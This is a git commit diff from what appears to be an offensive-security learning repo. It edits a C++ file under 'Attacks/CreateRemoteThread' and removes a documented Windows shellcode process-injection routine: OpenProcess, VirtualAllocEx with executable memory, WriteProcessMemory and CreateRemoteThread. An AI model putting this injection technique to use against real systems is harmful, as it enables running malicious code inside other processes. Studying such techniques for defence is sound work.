bb8aa7d55d54da95fb51adb2b62964f3d56c825c
Cooper <coopervk@gmail.com>
2020-03-07 23:44:12 -0600

    Revert "Make project x64"
    This reverts commit ed2fb60e1336e569ae545287323e02d2ff825a20.

--- Attacks/CreateRemoteThread/CreateRemoteThread.cpp
+++ Attacks/CreateRemoteThread/CreateRemoteThread.cpp
@@ -58,34 +58,11 @@ int main(int argc, char *argv[]) {
         printf("No PID was supplied. Exiting.\n");
         return -1;
     }
+ 
+    // For debug purposes
+    printf("Target PID: %d\n", pid);
 
-    // Open the process with enough permission to create a remote thread
-    // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
-    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
 
-    // Allocate enough space in the new process for our shellcode
-    // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
-    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-
-    // Write the shellcode into the space we allocated for it
-    // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
-    WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
-
-    // Create a thread and start it at the space we allocated and mapped the shellcode to
-    // https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
-    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
-
-    // Wait for the thread to finish
-    // https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject
-    WaitForSingleObject(remoteThread, INFINITE);
-
-    // Free the memory we allocated
-    // https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualfreeex
-    VirtualFreeEx(processHandle, remoteBuffer, sizeof shellcode, MEM_RELEASE);
-
-    // Close handle since we are no longer using it
-    // https://docs.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle
-    CloseHandle(processHandle);
 
     return 0;
 }
